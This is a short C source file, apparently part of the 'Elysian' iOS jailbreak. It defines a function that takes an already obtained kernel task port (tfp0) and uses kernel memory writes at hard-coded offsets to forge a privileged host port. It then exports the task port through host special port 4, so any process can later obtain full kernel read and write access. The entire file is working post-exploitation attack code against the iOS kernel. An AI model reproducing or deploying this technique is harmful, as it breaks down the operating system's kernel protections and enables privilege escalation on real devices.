//
//  sethsp4.c
//  Elysian
//
//  Created by chris  on 4/2/20.
//  Copyright © 2020 chr1s_0x1. All rights reserved.
//
#include "pac/parameters.h"
#include "pac/kernel.h"
#include "pac/kernel_memory.h"
#include "sethsp4.h"
#import "exploit.h"
#include "utils.h"
#import "kernel_memory.h"

int set_tfp0_hsp4(mach_port_t tfp0) {
    // check if we already exported tfp0
    host_t me = mach_host_self();
    static task_t ok = MACH_PORT_NULL;
    host_get_special_port(me, HOST_LOCAL_NODE, 4, &ok);
    if(MACH_PORT_VALID(ok)) {
        LOG("[set hsp4] tfp0 already exported!\n");
        ok = MACH_PORT_NULL;
        return 0;
    }
    
    // get our host, and host port
    host_t host_self = mach_host_self();
    uint64_t host_port = find_port(host_self);
    uint64_t hsp4 = find_port(tfp0);
    LOGM("hsp4: 0x%llx\n", hsp4);
    
    // Set hsp4
    wk32(host_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), io_makebits(1, IOT_PORT, IKOT_HOST_PRIV));
    uint64_t realhost = rk64(host_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    LOGM("realhost: 0x%llx\n", realhost); // just for debugging, will be removed
    wk64(realhost + 0x10 + 4 * sizeof(uint64_t), hsp4); // 0x10 = OFFSET(host, special)
    
    // check if we successfully set hsp4
    static task_t test = MACH_PORT_NULL;
    host_get_special_port(host_self, HOST_LOCAL_NODE, 4, &test);
    if(!MACH_PORT_VALID(test)) {
        LOG("[set hsp4] Failed to set HSP4 port\n");
        return 1;
    }
    
    LOG("[set hsp4] Exported tfp0 to HSP4\n");
    test = MACH_PORT_NULL;
    return 0;
}
